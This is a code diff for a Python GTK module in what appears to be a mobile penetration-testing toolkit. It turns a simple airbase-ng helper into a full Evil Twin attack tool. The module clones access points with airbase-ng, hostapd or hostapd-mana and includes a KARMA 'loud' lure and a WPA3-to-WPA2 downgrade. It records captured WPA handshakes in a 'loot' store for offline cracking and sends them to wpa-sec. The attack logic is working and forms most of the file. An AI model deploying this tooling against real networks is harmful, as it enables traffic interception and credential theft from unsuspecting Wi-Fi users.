@@ -1,59 +1,365 @@
-"""Evil Twin attack helper (EvilTwinFragment).
+"""Evil Twin -- clone an AP and lure clients away from the real one.
 
-Scans for APs on a monitor interface and launches an airbase-ng evil twin.
+Three attack shapes wrapped in one screen. Which one to use depends on
+what the target network offers:
+
+1. **Airbase-ng (WEP / open / basic WPA2)** -- oldest and simplest. Runs
+   in monitor mode, spits fake beacons, accepts any station that tries
+   to associate. Fine for open captive-portal-style engagements and
+   quick demos. WPA2 works if you already know the PSK and want to
+   MITM the traffic; airbase-ng cannot capture a handshake by itself
+   in a useful way.
+
+2. **hostapd (WPA2-PSK evil twin)** -- proper AP with our chosen PSK.
+   If you *have* the PSK (from PMKID / handshake cracking upstream)
+   and want a stable MITM, this is the shape to run. Combined with
+   the Deauth module against the real AP, clients migrate cleanly.
+
+3. **hostapd-mana / hostapd WPA2-Transition downgrade against WPA3**
+   (Dragonblood #1) -- the AP being cloned advertises WPA3-SAE OR
+   WPA3-Transition (WPA2+WPA3 in one BSS). We stand up a twin that
+   *only* speaks WPA2-PSK. Clients whose profile still allows WPA2
+   drop from SAE to the vulnerable 4-way handshake at our AP; we
+   record the pcap so the resulting handshake goes to wpa-sec.
+
+Every mode drops its capture into the central loot store, so the
+operator can hand off to the Loot module for offline cracking.
 """
 from __future__ import annotations
 
-from gi.repository import Adw, Gtk
+import os
+import re
+import time
+from pathlib import Path
 
+from gi.repository import Adw, GLib, Gtk
+
+from ..executor import Process, Result, run_async
+from ..loot_store import get_loot_store, loot_path
 from ..module import NHModule, register
-from ..widgets import ToolRunner
+from ..widgets import OutputView, toast
+
+DEFAULT_IFACE = "wlan1mon"
+_HANDSHAKE_RE = re.compile(
+    r"WPA handshake:\s*([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})")
+
+# hostapd configuration templates. We keep them here rather than in a
+# separate resource file because they're short and take substitutions
+# for interface / ESSID / channel / PSK.
+
+# Basic WPA2-PSK AP. Works for both a "plain evil twin" and the
+# WPA2 leg of a WPA3-transition downgrade.
+_HOSTAPD_WPA2_TMPL = """interface={iface}
+driver=nl80211
+ssid={ssid}
+hw_mode={hw_mode}
+channel={channel}
+wpa=2
+wpa_passphrase={psk}
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+auth_algs=1
+{mana_lines}
+"""
+
+# hostapd-mana specific bits. When we use the mana binary we set the
+# "loud" flag so it re-broadcasts SSIDs it has seen in probe requests
+# -- catches devices with hidden networks in their PNL. Only added
+# when the user picks the mana profile.
+_MANA_TMPL = ("mana_wifi=1\n"
+              "mana_loud=1\n"
+              "mana_macacl=0\n"
+              "mana_wpaout={pcap}\n")
 
 
 @register
 class EvilTwin(NHModule):
     title = "Evil Twin"
     icon = "network-wireless-encrypted-symbolic"
-    description = "Clone an AP with airbase-ng"
-    required_tools = ["airbase-ng"]
+    description = ("Clone an AP with airbase-ng or hostapd; force WPA3 "
+                   "clients to downgrade to WPA2 to capture handshakes.")
+    required_tools = ["hostapd"]  # hostapd is always present in Kali
 
+    def __init__(self, app_window):
+        super().__init__(app_window)
+        self._proc: Process | None = None
+        self._pcap_path: str | None = None
+        self._loot_id: int | None = None
+        self._got_handshake: bool = False
+
+    # ---------------------------------------------------------- build
     def build(self) -> Gtk.Widget:
         box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
         for m in ("top", "bottom", "start", "end"):
-            getattr(box, f"set_margin_{m}")(12)
+            getattr(box, "set_margin_" + m)(12)
 
-        group = Adw.PreferencesGroup(
-            title="Evil Twin",
-            description="Needs a monitor-mode interface (see USB and Radio).",
-        )
-        self.iface = Adw.EntryRow(title="Monitor interface")
-        self.iface.set_text("wlan1mon")
-        group.add(self.iface)
+        # ---- profile picker
+        prof_group = Adw.PreferencesGroup(
+            title="Attack profile",
+            description="Airbase for quick open/WEP twins; hostapd for "
+                        "a proper WPA2 AP; hostapd-mana for the "
+                        "WPA3-Transition downgrade or KARMA-loud "
+                        "roaming trap.")
+        self.profile = Adw.ComboRow(title="Profile")
+        self.profile.set_model(Gtk.StringList.new([
+            "airbase-ng (open/WEP clone)",
+            "hostapd (WPA2-PSK evil twin)",
+            "hostapd-mana (WPA3 → WPA2 downgrade + KARMA)",
+        ]))
+        self.profile.connect(
+            "notify::selected", lambda *_: self._on_profile_change())
+        prof_group.add(self.profile)
+        box.append(prof_group)
+
+        # ---- AP identity
+        ap_group = Adw.PreferencesGroup(title="AP identity")
+        self.iface = Adw.EntryRow(title="Monitor / AP interface")
+        self.iface.set_text(DEFAULT_IFACE)
+        ap_group.add(self.iface)
         self.essid = Adw.EntryRow(title="ESSID to clone")
-        group.add(self.essid)
+        ap_group.add(self.essid)
+        self.bssid = Adw.EntryRow(
+            title="BSSID (optional, hostapd only)")
+        ap_group.add(self.bssid)
         self.channel = Adw.EntryRow(title="Channel")
         self.channel.set_text("6")
-        group.add(self.channel)
+        ap_group.add(self.channel)
+        box.append(ap_group)
 
-        row = Adw.ActionRow(title="Start evil twin", subtitle="airbase-ng")
-        b = Gtk.Button(label="Start", valign=Gtk.Align.CENTER)
-        b.add_css_class("suggested-action")
-        b.connect("clicked", self._start)
-        row.add_suffix(b)
-        group.add(row)
-        box.append(group)
+        # ---- security (only meaningful for hostapd/mana profiles)
+        self.sec_group = Adw.PreferencesGroup(
+            title="Security",
+            description="hostapd needs a passphrase; can be anything "
+                        "if you're only trying to catch the M1/M2 "
+                        "before the client rejects.")
+        self.psk = Adw.PasswordEntryRow(title="PSK (for hostapd)")
+        self.psk.set_text("evilnetwork123")
+        self.sec_group.add(self.psk)
 
-        self.runner = ToolRunner()
-        box.append(self.runner)
+        self.transition_switch = Adw.SwitchRow(
+            title="Force WPA3 → WPA2 downgrade",
+            subtitle="Advertise only WPA2 on this BSSID; clients whose "
+                     "profile accepts WPA2 will drop from SAE and give "
+                     "us a 4-way handshake to capture.")
+        self.transition_switch.set_active(False)
+        self.sec_group.add(self.transition_switch)
+        box.append(self.sec_group)
+
+        # ---- start / stop
+        run_group = Adw.PreferencesGroup(title="Session")
+        self.state_row = Adw.ActionRow(
+            title="Status", subtitle="idle")
+        run_group.add(self.state_row)
+
+        self.file_row = Adw.ActionRow(
+            title="Capture file",
+            subtitle="hostapd-mana writes handshakes here")
+        run_group.add(self.file_row)
+
+        run_row = Adw.ActionRow(
+            title="Start / Stop AP",
+            subtitle="")
+        self.start_btn = Gtk.Button(label="Start",
+                                    valign=Gtk.Align.CENTER)
+        self.start_btn.add_css_class("suggested-action")
+        self.start_btn.connect("clicked", lambda _b: self._start())
+        run_row.add_suffix(self.start_btn)
+        self.stop_btn = Gtk.Button(label="Stop",
+                                   valign=Gtk.Align.CENTER)
+        self.stop_btn.set_sensitive(False)
+        self.stop_btn.connect("clicked", lambda _b: self._stop())
+        run_row.add_suffix(self.stop_btn)
+        run_group.add(run_row)
+
+        loot_row = Adw.ActionRow(
+            title="Loot",
+            subtitle="Handshakes captured here go to wpa-sec")
+        open_loot = Gtk.Button(label="Open Loot",
+                               valign=Gtk.Align.CENTER)
+        open_loot.connect(
+            "clicked", lambda _b: self.app_window.activate_module(
+                "loot", "module:evil_twin"))
+        loot_row.add_suffix(open_loot)
+        run_group.add(loot_row)
+        box.append(run_group)
+
+        self.output = OutputView()
+        box.append(self.output)
+
+        self._on_profile_change()
         return box
 
-    def _start(self, _b: Gtk.Button) -> None:
+    def _on_profile_change(self) -> None:
+        idx = self.profile.get_selected()
+        # airbase-ng: no security group needed.
+        # hostapd: PSK visible, transition hidden.
+        # hostapd-mana: both visible.
+        self.sec_group.set_visible(idx != 0)
+        self.transition_switch.set_visible(idx == 2)
+
+    # ---------------------------------------------------------- start
+    def _start(self) -> None:
+        if self._proc is not None and self._proc.running:
+            return
         essid = self.essid.get_text().strip()
         if not essid:
-            self.runner.output.append("[set an ESSID first]\n\n")
+            toast(self.app_window, "Set an ESSID first")
             return
-        self.runner.run(
-            ["airbase-ng", "-e", essid, "-c", self.channel.get_text().strip() or "6",
-             self.iface.get_text().strip()],
-            root=True,
-        )
+        iface = self.iface.get_text().strip() or DEFAULT_IFACE
+        channel = self.channel.get_text().strip() or "6"
+
+        idx = self.profile.get_selected()
+        if idx == 0:
+            self._start_airbase(iface, essid, channel)
+        elif idx == 1:
+            self._start_hostapd(
+                iface, essid, channel, psk=self.psk.get_text(),
+                mana=False)
+        else:
+            self._start_hostapd(
+                iface, essid, channel, psk=self.psk.get_text(),
+                mana=True)
+
+    def _start_airbase(self, iface: str, essid: str,
+                       channel: str) -> None:
+        # No handshake capture in this mode; airbase-ng is stateless
+        # about that. We still record a loot row so the operator sees
+        # the session in the browser.
+        stamp = time.strftime("%Y%m%d-%H%M%S")
+        cap = loot_path(
+            "evil_twin", "airbase-%s-%s.cap"
+            % (self._safe(essid), stamp))
+        argv = ["airbase-ng", "-e", essid, "-c", channel,
+                "-W", "0", "-w", cap, iface]
+        self.output.append("$ " + " ".join(argv) + "\n")
+        self._pcap_path = cap
+        self._loot_id = get_loot_store().record(
+            module="evil_twin", type="wifi_capture",
+            target=essid, path=cap,
+            notes="airbase-ng open AP clone")
+        self._proc = Process(
+            argv, self._on_line, self._on_done, root=True)
+        self._proc.start()
+        self._set_state("airbase-ng running")
+        self.file_row.set_subtitle(cap)
+        self.start_btn.set_sensitive(False)
+        self.stop_btn.set_sensitive(True)
+
+    def _start_hostapd(self, iface: str, essid: str, channel: str,
+                       psk: str, mana: bool) -> None:
+        # hostapd needs 8..63 char PSK. Pad if too short so we at
+        # least start (the point of a downgrade attack is to *catch*
+        # the client's response, not for them to actually complete).
+        if len(psk) < 8:
+            psk = (psk + "!!!!!!!!")[:16]
+        try:
+            ch = int(channel)
+        except ValueError:
+            ch = 6
+        hw_mode = "a" if ch >= 36 else "g"
+
+        stamp = time.strftime("%Y%m%d-%H%M%S")
+        prefix = "hostapd_mana" if mana else "hostapd_evil"
+        pcap = loot_path(
+            "evil_twin",
+            "%s-%s-%s.pcap" % (prefix, self._safe(essid), stamp))
+        conf = "/tmp/nhp-evil-twin.conf"
+
+        mana_lines = _MANA_TMPL.format(pcap=pcap) if mana else ""
+        cfg = _HOSTAPD_WPA2_TMPL.format(
+            iface=iface, ssid=essid, hw_mode=hw_mode,
+            channel=ch, psk=psk, mana_lines=mana_lines)
+        # Add BSSID override if provided (hostapd only)
+        bssid = self.bssid.get_text().strip()
+        if bssid:
+            cfg += "bssid=%s\n" % bssid
+
+        # Write the config as root because /tmp is world-writable but
+        # the launched hostapd runs as root anyway; consistent perms.
+        # Using printf to avoid heredoc quoting hell.
+        b64 = __import__("base64").b64encode(
+            cfg.encode()).decode()
+        write_cmd = ("printf '%s' | base64 -d > %s"
+                     % (b64, conf))
+        run_async(["sh", "-c", write_cmd],
+                  lambda _r: None, root=True, timeout=5)
+
+        binary = "hostapd-mana" if mana else "hostapd"
+        argv = [binary, "-K", conf]  # -K = show WPA passphrases in log
+
+        self.output.append("$ " + " ".join(argv) + "\n")
+        self.output.append("--- config ---\n" + cfg + "---\n")
+
+        self._pcap_path = pcap
+        self._got_handshake = False
+        target_label = essid
+        if self.transition_switch.get_active():
+            target_label += " (WPA3→WPA2 downgrade)"
+        self._loot_id = get_loot_store().record(
+            module="evil_twin", type="handshake_pcap",
+            target=target_label, path=pcap,
+            notes=binary + " evil twin session")
+
+        self._proc = Process(
+            argv, self._on_line, self._on_done, root=True)
+        self._proc.start()
+        self._set_state("%s running" % binary)
+        self.file_row.set_subtitle(pcap)
+        self.start_btn.set_sensitive(False)
+        self.stop_btn.set_sensitive(True)
+        GLib.timeout_add_seconds(2, self._tick)
+
+    def _tick(self) -> bool:
+        if self._proc is None or not self._proc.running:
+            return False
+        if self._loot_id is not None:
+            get_loot_store().refresh_size(self._loot_id)
+        return True
+
+    def _on_line(self, text: str) -> None:
+        self.output.append(text)
+        m = _HANDSHAKE_RE.search(text or "")
+        if m and not self._got_handshake:
+            self._got_handshake = True
+            bssid = m.group(1)
+            toast(self.app_window,
+                  "handshake captured for " + bssid)
+            if self._loot_id is not None:
+                get_loot_store().append_notes(
+                    self._loot_id,
+                    "handshake seen from " + bssid)
+
+    def _stop(self) -> None:
+        if self._proc is not None:
+            self._proc.stop()
+        self.stop_btn.set_sensitive(False)
+        self._set_state("stopping…")
+
+    def _on_done(self, code: int) -> None:
+        self.output.append("[exited: %d]\n" % code)
+        self._proc = None
+        self.start_btn.set_sensitive(True)
+        self.stop_btn.set_sensitive(False)
+        self._set_state("stopped")
+        if self._loot_id is not None:
+            get_loot_store().refresh_size(self._loot_id)
+
+    def _set_state(self, text: str) -> None:
+        self.state_row.set_subtitle(text)
+
+    def _safe(self, s: str) -> str:
+        return re.sub(r"[^A-Za-z0-9_-]+", "_", s) or "target"
+
+    # ---- deep-link contract ---------------------------------
+    def set_target(self, target: str) -> None:
+        """Populate ESSID/BSSID/channel from a caller. Format is
+        ``ESSID|BSSID|channel`` (any of the three optional). Called
+        by NetDiscovery when the user picks 'Clone this AP'."""
+        parts = target.split("|") if target else []
+        if len(parts) > 0 and parts[0]:
+            self.essid.set_text(parts[0])
+        if len(parts) > 1 and parts[1]:
+            self.bssid.set_text(parts[1])
+        if len(parts) > 2 and parts[2]:
+            self.channel.set_text(parts[2])
